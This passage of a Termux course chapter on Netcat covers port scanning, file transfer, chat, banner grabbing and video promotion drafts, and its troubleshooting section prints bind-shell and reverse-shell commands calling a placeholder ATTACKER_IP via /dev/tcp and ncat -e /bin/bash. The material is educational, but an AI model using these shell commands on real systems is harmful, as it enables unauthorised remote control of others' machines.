ncat -lvp 4444 -e /bin/bash

# 47. SSL encrypted shell
ncat --ssl -lvp 4444 -e /bin/bash

# 48. Restricted shell access
nc -lvp 4444 -e /bin/rbash

# 49. Execute script on connection
nc -lvp 4444 -e /path/to/script.sh

# 50. Two-way relay
# Machine A
nc -lvp 4444 | nc target.com 80
```

---

## 💻 PRACTICE EXERCISES

### Exercise 1: Basic Netcat Connection

```bash
# Task: Establish connection to a web server and get HTML

# Step 1: Connect to example.com
nc example.com 80

# Step 2: Type HTTP request
GET / HTTP/1.1
Host: example.com

# Press Enter twice

# Expected: HTML response from server
```

### Exercise 2: Port Scanning

```bash
# Task: Scan your local network for open ports

# Step 1: Find your network range
ifconfig | grep inet

# Step 2: Scan a host for common ports
nc -zv 192.168.1.1 22,80,443,8080

# Step 3: Fast scan with timeout
nc -zvn -w 1 192.168.1.1 1-1000

# Step 4: Create a scan script
for port in 22 80 443 3306 8080; do
    nc -zv -w 2 192.168.1.1 $port 2>&1
done
```

### Exercise 3: Chat Server Setup

```bash
# Task: Set up two-way chat between devices

# Device 1 (Server):
nc -lvp 4444

# Device 2 (Client):
nc <SERVER_IP> 4444

# Test by typing messages back and forth
# Expected: Messages appear on both sides
```

### Exercise 4: File Transfer

```bash
# Task: Transfer a file between two Termux instances

# Step 1: Create a test file (Sender)
echo "This is a test file for Netcat transfer" > testfile.txt

# Step 2: Start receiver (Device 1)
nc -lvp 4444 > received.txt

# Step 3: Send file (Device 2)
nc <RECEIVER_IP> 4444 < testfile.txt

# Step 4: Verify
cat received.txt

# Expected: File contents match
```

### Exercise 5: Banner Grabbing

```bash
# Task: Grab banners from various services

# SSH Banner
nc scanme.nmap.org 22
# Expected: SSH version string

# HTTP Banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc scanme.nmap.org 80
# Expected: HTTP server header

# Create a banner grabbing script
cat > banner_grab.sh << 'EOF'
#!/bin/bash
target=$1
for port in 22 80 443; do
    echo "Port $port:"
    echo "" | timeout 2 nc -v $target $port 2>&1
done
EOF

chmod +x banner_grab.sh
./banner_grab.sh scanme.nmap.org
```

### Exercise 6: HTTP Server with Netcat

```bash
# Task: Create a simple HTTP server

# Create response
cat > response.txt << 'EOF'
HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head><title>Netcat Server</title></head>
<body>
<h1>Hello from Netcat!</h1>
<p>This is a simple HTTP server running on Netcat.</p>
</body>
</html>
EOF

# Start server
while true; do
    nc -lvp 8080 < response.txt
done

# Test with browser or curl
# curl http://localhost:8080
```

### Exercise 7: Secure File Transfer

```bash
# Task: Transfer file with encryption

# Install OpenSSL
pkg install openssl

# Receiver (listen and decrypt)
nc -lvp 4444 | openssl enc -aes-256-cbc -d -pass pass:mysecret -out received.txt

# Sender (encrypt and send)
openssl enc -aes-256-cbc -salt -pass pass:mysecret -in secret.txt | nc <RECEIVER_IP> 4444

# Verify
cat received.txt
```

### Exercise 8: Create a Netcat Port Scanner Script

```bash
# Task: Build a comprehensive port scanner

cat > nc_scanner.sh << 'EOF'
#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

target=$1
ports=${2:-"22,80,443,3306,8080"}

echo "==================================="
echo "Netcat Port Scanner"
echo "Target: $target"
echo "Ports: $ports"
echo "==================================="

for port in $(echo $ports | tr ',' ' '); do
    if nc -zvn -w 2 $target $port 2>&1 | grep -q succeeded; then
        echo -e "${GREEN}[OPEN]${NC} Port $port"
    else
        echo -e "${RED}[CLOSED]${NC} Port $port"
    fi
done

echo "==================================="
echo "Scan Complete"
EOF

chmod +x nc_scanner.sh

# Test
./nc_scanner.sh scanme.nmap.org "22,80,443"
```

---

## ⚠️ TROUBLESHOOTING

### Problem 1: "Connection refused"

```bash
# Cause: Target port not open or service not running

# Solution 1: Check if port is actually open
nc -zv target_ip port

# Solution 2: Check if service running
# On target machine
netstat -tulpn | grep port

# Solution 3: Check firewall
# On target machine
iptables -L -n | grep port

# Solution 4: Try different port
nc -zv target_ip 80
```

### Problem 2: "Connection timed out"

```bash
# Cause: Firewall blocking, host unreachable, or wrong IP

# Solution 1: Check connectivity
ping target_ip

# Solution 2: Increase timeout
nc -w 10 target_ip port

# Solution 3: Try different network
# Check if you're on the right network

# Solution 4: Use verbose mode
nc -vv target_ip port
```

### Problem 3: "-e option not available"

```bash
# Cause: OpenBSD netcat (doesn't have -e flag for security)

# Solution 1: Use ncat instead
pkg install ncat
ncat -lvp 4444 -e /bin/bash

# Solution 2: Use named pipes
mkfifo /tmp/f
cat /tmp/f | /bin/bash 2>&1 | nc -lvp 4444 > /tmp/f

# Solution 3: Use different reverse shell method
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Solution 4: Install traditional netcat from source
```

### Problem 4: "Address already in use"

```bash
# Cause: Port already being used by another process

# Solution 1: Find and kill the process
lsof -i :4444
kill -9 <PID>

# Solution 2: Use different port
nc -lvp 4445

# Solution 3: Use SO_REUSEADDR (ncat)
ncat -lvp 4444

# Solution 4: Wait for previous connection to close
# Then try again
```

### Problem 5: "nc: command not found"

```bash
# Cause: Netcat not installed

# Solution 1: Install netcat
pkg update && pkg install netcat -y

# Solution 2: Install ncat
pkg install ncat -y

# Solution 3: Check PATH
echo $PATH
which nc

# Solution 4: Use full path
/data/data/com.termux/files/usr/bin/nc
```

### Problem 6: File transfer incomplete

```bash
# Cause: Connection closed before transfer complete

# Solution 1: Use timeout
nc -w 60 -lvp 4444 > file.txt

# Solution 2: Use pv for progress
pv file.txt | nc target_ip 4444

# Solution 3: Check file sizes
ls -la file.txt
ls -la received.txt

# Solution 4: Use md5sum to verify
md5sum file.txt
md5sum received.txt

# Solution 5: Use tar for directories
tar cf - directory/ | nc target_ip 4444
```

### Problem 7: Reverse shell not working

```bash
# Cause: Firewall, wrong IP, or shell syntax

# Solution 1: Verify listener is running
# On attacker machine
nc -lvp 4444

# Solution 2: Check IP is correct
# On victim machine
curl ifconfig.me

# Solution 3: Try different payload
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;...'

# Solution 4: Check for -e flag
nc -h | grep "\-e"

# Solution 5: Use ncat with SSL
ncat --ssl -lvp 4444  # Listener
ncat --ssl ATTACKER_IP 4444 -e /bin/bash  # Victim
```

### Problem 8: Slow port scanning

```bash
# Cause: Timeout too long or DNS resolution

# Solution 1: Reduce timeout
nc -zvn -w 1 target_ip 1-1000

# Solution 2: Skip DNS resolution
nc -zvn target_ip 1-1000

# Solution 3: Scan in parallel
for port in {1..100}; do
    (nc -zvn -w 1 target_ip $port 2>&1 | grep succeeded) &
done
wait

# Solution 4: Use nmap for faster scanning
pkg install nmap
nmap -T4 target_ip
```

---

## 🎬 VIDEO ASSETS

### Thumbnail Concepts

**Option A: Professional Style**
```
┌────────────────────────────────────┐
│  [Dark Terminal Background]        │
│                                    │
│   🔧 NETCAT MASTERY                │
│   Swiss Army Knife of Networking   │
│                                    │
│   ✓ Port Scanning                  │
│   ✓ File Transfer                  │
│   ✓ Reverse Shells                 │
│                                    │
│   [T3rmuxk1ng Logo]                │
└────────────────────────────────────┘
```

**Option B: Hacking Theme**
```
┌────────────────────────────────────┐
│  💀 NETCAT = HACKER'S BEST FRIEND  │
│                                    │
│  nc -lvp 4444 -e /bin/bash         │
│                                    │
│  ⚡ Port Scan ⚡ Shells ⚡ Transfer  │
│                                    │
│  Chapter 27 | T3rmuxk1ng           │
└────────────────────────────────────┘
```

**Option C: Feature Highlight**
```
┌────────────────────────────────────┐
│  🛠️ NETCAT (nc) COMPLETE GUIDE     │
│                                    │
│  30+ Practical Examples            │
│  ├── Port Scanning                 │
│  ├── Chat Server                   │
│  ├── File Transfer                 │
│  ├── Banner Grabbing               │
│  └── Reverse/Bind Shells           │
│                                    │
│  Master Networking Tools!          │
└────────────────────────────────────┘
```

### Video Description Template

```markdown
🔧 Termux Full Course - Chapter 27: Netcat (nc) Mastery | Swiss Army Knife of Networking

🔥 In this video you'll learn:
• Netcat kya hai aur kyun important hai
• Netcat installation in Termux
• Important flags: -l, -p, -v, -z, -e, -u, -n, -w
• Port scanning with nc
• Chat server setup (two-way communication)
• File transfer between devices
• Banner grabbing techniques
• Reverse shell basics (educational)
• Bind shell basics (educational)
• Netcat alternatives: ncat, socat
• 30+ practical examples

⏱️ Timestamps:
0:00 - Introduction
0:50 - Netcat Introduction
3:30 - Installation
5:30 - Flags Explained
9:00 - Port Scanning
12:00 - Chat Server
15:00 - File Transfer
17:30 - Banner Grabbing
19:00 - Reverse Shells (Educational)
22:00 - Bind Shells (Educational)
24:00 - Netcat Alternatives
26:00 - Summary

📝 Important Commands:
pkg install netcat -y
nc -lvp 4444
nc -zv 192.168.1.1 1-1000
nc -lvp 4444 > file.txt
nc 192.168.1.100 4444 < file.txt

⚠️ DISCLAIMER: This video is for educational purposes only. 
Use these techniques responsibly and only on systems you have permission to test.
Unauthorized access to computer systems is illegal.

📚 Full Course Playlist:
[PLAYLIST LINK]

📱 Follow T3rmuxk1ng:
• YouTube: @T3rmuxk1ng
• Telegram: [LINK]
• GitHub: [LINK]

#Termux #Netcat #NcCommand #TermuxCourse #T3rmuxk1ng #NetworkingTools #EthicalHacking #CyberSecurity #PortScanning #ReverseShell #TermuxHindi

---
⚠️ Disclaimer: This video is for educational purposes. Use tools responsibly and only on systems you have permission to test.
```

### Tags List

```
netcat, nc command, netcat tutorial, netcat termux, nc termux,
netcat hindi, netcat mastery, port scanning, file transfer,
reverse shell, bind shell, netcat chat server, banner grabbing,
networking tools, termux networking, termux course, t3rmuxk1ng,
ethical hacking, cybersecurity, penetration testing, nc flags,
ncat vs netcat, socat, swiss army knife networking, 
termux tutorial hindi, netcat examples, nc port scan,
netcat file transfer, reverse shell termux, termux hacking
```

### Hashtags

```
#Termux #Netcat #NcCommand #TermuxCourse #T3rmuxk1ng #NetworkingTools 
#EthicalHacking #CyberSecurity #PortScanning #ReverseShell #HindiTutorial 
#TermuxHindi #LearnNetcat #NetcatMastery #PenetrationTesting
```

---

## 📚 ADDITIONAL RESOURCES

### Official Documentation

| Resource | Link |
|----------|------|
| Netcat Man Page | `man nc` |
| Ncat Documentation | https://nmap.org/ncat/ |
| Socat Documentation | `man socat` |

### Cheat Sheets

| Resource | Description |
|----------|-------------|
| Netcat Cheat Sheet | One-page reference |
| Reverse Shell Cheat Sheet | Payloads for all languages |
| PayloadsAllTheThings | GitHub repository |

### Practice Platforms

| Platform | Purpose |
|----------|---------|
| TryHackMe | Interactive labs |
| HackTheBox | Real-world scenarios |
| VulnHub | Vulnerable VMs |
| OverTheWire | Wargames |

---

## ✅ CHAPTER CHECKLIST

Before moving to Chapter 28, verify:

- [ ] Netcat installed successfully: `pkg install netcat -y`
- [ ] Basic connection works: `nc google.com 80`
- [ ] Listener mode tested: `nc -lvp 4444`
- [ ] Port scanning practiced: `nc -zv target ports`
- [ ] File transfer completed between devices
- [ ] Banner grabbing understood
- [ ] Chat server setup completed
- [ ] Understand reverse vs bind shell concepts
- [ ] Know the important flags: -l, -p, -v, -z, -e, -u
- [ ] Familiar with ncat and socat alternatives

---

## 🎯 NEXT CHAPTER PREVIEW

**Chapter 28: HTTP Tools (curl & wget)**

- curl command mastery
- wget for downloads
- HTTP methods with curl
- API testing with curl
- Headers and cookies
- Authentication methods
- File upload/download
- Web scraping basics

---

**Chapter Complete! 🎉**

*Created by T3rmuxk1ng | Termux Full Course*
